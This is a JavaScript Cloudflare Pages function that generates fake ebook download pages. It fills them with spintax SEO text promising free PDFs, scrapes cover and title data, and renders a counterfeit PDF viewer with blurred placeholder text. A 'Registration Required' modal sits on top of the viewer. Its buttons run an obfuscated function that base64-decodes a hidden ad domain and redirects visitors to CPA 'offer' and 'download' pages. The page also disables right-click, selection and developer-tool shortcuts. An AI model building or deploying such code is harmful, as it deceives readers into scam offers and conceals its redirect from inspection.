// Path: functions/post/[id].js

// --- CONFIG ---
const DESC_TEMPLATES = [
  "Read {TITLE} online for free. Download the full PDF or Epub version. High quality digital edition available now.",
  "Get the complete edition of {TITLE}. Instant access to the full book. No registration needed for preview.",
  "Full text archive: {TITLE}. Masterpiece collection. Download or stream the audiobook directly.",
  "Exclusive document: {TITLE}. View the secured content and download the complete file."
];

// --- HELPER FUNCTIONS ---
function stringToHash(s){let h=0;if(!s)return h;for(let i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h=h&h}return Math.abs(h)}
function getSpintaxDesc(t){const h=stringToHash(t||"Document");return DESC_TEMPLATES[h%DESC_TEMPLATES.length].replace("{TITLE}",t||"Document")}

async function getPostFromDB(db, id) {
  try {
    const stmt = db.prepare("SELECT Judul, Image, Author, Kategori FROM Buku WHERE KodeUnik = ?").bind(id);
    return await stmt.first();
  } catch(e) { return null; }
}

async function getAmazonDataViaRedirect(id) {
  try {
    const r = await fetch(`https://www.goodreads.com/book_link/follow/1?book_id=${id}&source=compareprices`, {headers:{'User-Agent':'Mozilla/5.0'},redirect:'follow'});
    const m = r.url.match(/\/(dp|gp\/product|d)\/([A-Z0-9]{10})/);
    if(m&&m[2]) return {found:true, image:`https://images-na.ssl-images-amazon.com/images/P/${m[2]}.01.LZZZZZZZ.jpg`, title:"Kindle Digital Edition"};
  } catch(e){} return {found:false};
}

async function getDataFallback(id) {
  let d={Judul:"Restricted Document",Image:"",Author:"Unknown Author",Kategori:"General",KodeUnik:id};
  try {
    if(id.startsWith("A-")||/^B[A-Z0-9]{9}$/.test(id)){
      const rid=id.startsWith("A-")?id.substring(2):id;
      d.Image=`https://images-na.ssl-images-amazon.com/images/P/${rid}.01.LZZZZZZZ.jpg`; d.Kategori="Kindle Ebook";
      try{const r=await fetch(`https://openlibrary.org/search.json?q=${rid}&fields=title,author_name`,{cf:{cacheTtl:86400}});const j=await r.json();if(j.docs&&j.docs.length>0){d.Judul=j.docs[0].title;if(j.docs[0].author_name)d.Author=j.docs[0].author_name[0]}else{d.Judul="Kindle Secure Content"}}catch(e){d.Judul="Kindle Secure Content"}
      return d;
    }
    if(id.startsWith("B-")||/^\d{9}[\d|X]$|^\d{13}$/.test(id.replace(/-/g,""))){
      const rid=id.startsWith("B-")?id.substring(2):id; const clean=rid.replace(/-/g,"");
      d.Image=`https://covers.openlibrary.org/b/isbn/${clean}-L.jpg`; let ft=false;
      try{const r=await fetch(`https://openlibrary.org/isbn/${clean}.json`,{cf:{cacheTtl:86400}});if(r.ok){const j=await r.json();if(j.title){d.Judul=j.title;ft=true}}}catch(e){}
      if(!ft){const amz=await getAmazonDataViaRedirect(clean);if(amz.found){d.Image=amz.image;if(amz.title!=="Kindle Digital Edition")d.Judul=amz.title}else{d.Judul="Archived Document"}}
      return d;
    }
  }catch(e){} return d;
}

function renderFakeViewer(post, SITE_URL) {
  const metaDescription = getSpintaxDesc(post.Judul);
  let coverImage = post.Image || "";
  
  const generatedDesc = `<p>Are you looking for <strong>${post.Judul}</strong>? This is the perfect place to download or read it online. Digital content provided by <em>${post.Author||'Unknown Author'}</em>.</p><p>This document belongs to the <strong>${post.Kategori||'General'}</strong> category.</p><p>Join our community to access the full document. Registration is free and takes less than 2 minutes.</p>`;
  const cssTextPattern = `background-image: repeating-linear-gradient(transparent, transparent 12px, #e5e5e5 13px, #e5e5e5 15px); background-size: 100% 100%;`;

  return `
<!DOCTYPE html>
<html lang="en" oncontextmenu="return false;">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>${post.Judul}</title>
    <meta name="description" content="${metaDescription}">
    <meta property="og:image" content="${coverImage || 'https://via.placeholder.com/300?text=Document'}" />
    <link href="https://fonts.googleapis.com/css?family=Mukta+Malar:400,600,800" rel="stylesheet">
    <style>
        * { box-sizing: border-box; -webkit-touch-callout: none; -webkit-user-select: none; user-select: none; }
        body { margin: 0; padding: 0; font-family: 'Mukta Malar', sans-serif; background-color: #525659; overflow: hidden; height: 100vh; }
        .navbar { height: 48px; background-color: #323639; display: flex; align-items: center; justify-content: space-between; padding: 0 10px; color: #f1f1f1; font-size: 14px; position: fixed; top: 0; width: 100%; z-index: 100; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
        .nav-title { font-weight: 600; color: #14AF64; text-transform: uppercase; letter-spacing: 0.5px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 60%; }
        .nav-right { display: flex; gap: 15px; align-items: center; }
        .main-container { display: flex; height: 100vh; padding-top: 48px; }
        .sidebar { width: 240px; background-color: #323639; border-right: 1px solid #444; overflow-y: hidden; display: flex; flex-direction: column; align-items: center; padding: 20px 0; flex-shrink: 0; }
        .thumb-page { width: 120px; height: 160px; background: white; margin-bottom: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.3); position: relative; overflow: hidden; opacity: 0.6; transition: 0.2s; cursor: pointer; }
        .thumb-page.active { border: 3px solid #14AF64; opacity: 1; }
        .text-pattern { width: 100%; height: 100%; padding: 10px; ${cssTextPattern} }
        .text-header { width: 60%; height: 8px; background: #ccc; margin-bottom: 15px; }
        .content-area { flex-grow: 1; background-color: #525659; overflow-y: auto; display: flex; justify-content: center; padding: 40px; position: relative; }
        .pdf-page { width: 100%; max-width: 800px; min-height: 1100px; background-color: white; box-shadow: 0 0 15px rgba(0,0,0,0.5); padding: 50px; display: flex; flex-direction: column; align-items: center; position: relative; margin-bottom: 20px; }
        .cover-wrapper { width: 100%; max-width: 400px; min-height: 550px; display: flex; justify-content: center; align-items: center; margin-bottom: 30px; position: relative; }
        .pdf-cover-img { width: 100%; height: auto; box-shadow: 0 10px 25px rgba(0,0,0,0.3); z-index: 2; pointer-events: none; }
        .fallback-cover { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(135deg, #333 0%, #555 100%); display: flex; flex-direction: column; justify-content: center; align-items: center; color: white; text-align: center; padding: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); border: 2px solid #fff; }
        .fallback-title { font-size: 24px; font-weight: 800; margin-bottom: 10px; line-height: 1.3; }
        .fallback-sub { font-size: 14px; opacity: 0.8; text-transform: uppercase; letter-spacing: 1px; }
        .blurred-text-content { width: 100%; filter: blur(4px); opacity: 0.6; user-select: none; margin-top: 20px; }
        .b-line { height: 12px; background: #333; margin-bottom: 10px; width: 100%; opacity: 0.7; }
        .info-bar { position: absolute; top: 48px; left: 0; width: 100%; background: #fff; color: #333; padding: 10px 20px; font-size: 13px; border-bottom: 1px solid #ddd; z-index: 90; display: flex; align-items: center; gap: 10px; }
        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 200; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(5px); }
        .modal-box { background: white; width: 90%; max-width: 450px; border-radius: 8px; overflow: hidden; animation: popIn 0.3s ease-out; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        .modal-body { padding: 30px; text-align: center; }
        .modal-cover-wrapper { width: 120px; height: 180px; margin: 0 auto 20px auto; position: relative; }
        .modal-img { width: 100%; height: 100%; object-fit: cover; border-radius: 4px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); pointer-events: none; }
        .modal-fallback { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #eee; border: 1px solid #ddd; display: flex; align-items: center; justify-content: center; font-size: 30px; color: #aaa; border-radius: 4px; }
        .btn { display: block; width: 100%; padding: 15px; margin: 10px 0; font-weight: bold; text-transform: uppercase; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; color: white; transition: 0.2s; }
        .btn-signup { background-color: #d9534f; }
        .btn-signup:hover { background-color: #c9302c; }
        .btn-download { background-color: #4285f4; }
        @media (max-width: 768px) { .sidebar, .info-bar { display: none; } }
    </style>
</head>
<body onkeydown="return false">
    <nav class="navbar"><div class="nav-title">WWW.${new URL(SITE_URL).hostname.toUpperCase()}</div><div class="nav-right"><span style="background:#000; padding:2px 8px; border-radius:4px; font-size:11px;">1 / 154</span></div></nav>
    <div class="info-bar"><span>⚠️</span> <span>You are about to access "<strong>${post.Judul}</strong>". Available formats: PDF, TXT, ePub.</span></div>
    <div class="main-container">
        <div class="sidebar">
            <div class="thumb-page active"><div class="text-pattern"><div class="text-header" style="background: #14AF64;"></div></div></div>
            <div class="thumb-page"><div class="text-pattern"><div class="text-header"></div></div></div>
            <div class="thumb-page"><div class="text-pattern"></div></div>
        </div>
        <div class="content-area">
            <div class="pdf-page">
                <div class="cover-wrapper">
                    <div id="fallback-cover-main" class="fallback-cover" style="display: ${coverImage ? 'none' : 'flex'};"><div class="fallback-title">${post.Judul}</div><div class="fallback-sub">Protected Document</div></div>
                    ${coverImage ? `<img src="${coverImage}" class="pdf-cover-img" alt="${post.Judul}" onerror="this.style.display='none'; document.getElementById('fallback-cover-main').style.display='flex';">` : ''}
                </div>
                <h2 style="text-align:center; color:#333; margin-top:0;">Description</h2>
                <div style="color:#444; line-height:1.6; font-size:14px; margin-bottom:30px;">${generatedDesc}</div>
                <div class="blurred-text-content"><div class="b-line" style="width: 100%"></div><div class="b-line" style="width: 90%"></div><div class="b-line" style="width: 95%"></div><div class="b-line" style="width: 85%"></div></div>
            </div>
        </div>
    </div>
    <div class="modal-overlay">
        <div class="modal-box">
            <div class="modal-body">
                <h3 style="margin-top: 0; color: #333;">Registration Required</h3>
                <div class="modal-cover-wrapper">
                     <div id="fallback-cover-modal" class="modal-fallback" style="display: ${coverImage ? 'none' : 'flex'};">📖</div>
                     ${coverImage ? `<img src="${coverImage}" class="modal-img" onerror="this.style.display='none'; document.getElementById('fallback-cover-modal').style.display='flex';">` : ''}
                </div>
                <p style="color: #666; font-size: 14px; margin-bottom: 20px;">You need a verified account to access:<br><strong style="font-size: 16px; color: #333; display:block; margin: 5px 0;">${post.Judul}</strong><span style="font-size: 13px;">Sign up takes less than 2 minutes.</span></p>
                <button class="btn btn-signup" onclick="_0x4d2e()">Create Free Account</button>
                <button class="btn btn-download" onclick="_0x4d2e()">Download PDF</button>
            </div>
        </div>
    </div>
    <script>
        function _0x4d2e() {
            var _part1 = "aHR0cHM6Ly9hZHMuY2FudGlrdWwubXkuaWQ="; 
            var _domain = atob(_part1); 
            var _cpa = _domain + "/offer";
            var _ads = _domain + "/download";
            
            var _win = window.open(_cpa, '_blank');
            if (_win) { window.location.href = _ads; _win.focus(); } 
            else { window.location.href = _cpa; }
        }
        document.onkeydown = function(e) {
            if(event.keyCode == 123) return false;
            if(e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0))) return false;
            if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
        }
    </script>
</body>
</html>
  `;
}

export async function onRequestGet(context) {
  const { env, params, request } = context; 
  const db = env.DB; const url = new URL(request.url);
  const cacheKey = new Request(url.toString(), request); const cache = caches.default;
  
  // Cek Cache Cloudflare Biar Cepat
  let response = await cache.match(cacheKey); 
  if (response) return response;
  
  try {
    const SITE_URL = url.origin; 
    const uniqueCode = params.id; 
    
    // 1. Coba ambil dari DB Local (Kalau kamu upload CSV nanti)
    let post = await getPostFromDB(db, uniqueCode);
    
    // 2. Kalau di DB gak ada, Coba cari otomatis (Scraping Ringan)
    if (!post) post = await getDataFallback(uniqueCode);
    
    // 3. Render HTML
    const html = renderFakeViewer(post, SITE_URL);
    
    response = new Response(html, { status: 200, headers: { "Content-Type": "text/html;charset=UTF-8", "Cache-Control": "public, max-age=31536000, s-maxage=31536000" }});
    
    // Simpan ke Cache
    context.waitUntil(cache.put(cacheKey, response.clone()));
    return response;
  } catch (e) { return new Response("Error: " + e.message, { status: 500 }); }
}
